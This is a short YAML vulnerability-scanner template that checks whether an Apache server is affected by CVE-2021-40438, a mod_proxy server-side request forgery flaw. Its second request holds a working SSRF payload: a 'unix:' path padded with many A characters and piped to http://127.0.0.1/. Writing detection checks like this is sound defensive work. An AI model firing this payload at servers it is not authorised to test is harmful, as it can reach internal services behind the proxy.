id: CVE-2021-40438
name: "Apache mod_proxy SSRF"
severity: critical
description: "Apache HTTP Server 2.4.48 and earlier mod_proxy allows SSRF via a crafted request URI, enabling attackers to cause the server to make requests to arbitrary origins."
reference: CWE-918
confidence: tentative
requests:
  - method: GET
    path: "/"
    matchers:
      - type: header
        header: "server"
        words:
          - "Apache"
      - type: body
        words:
          - "Apache"
    condition: or
  - method: GET
    path: "/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://127.0.0.1/"
    matchers:
      - type: body
        words:
          - "Apache"
      - type: status
        status: [200, 301, 302, 503]
    condition: and
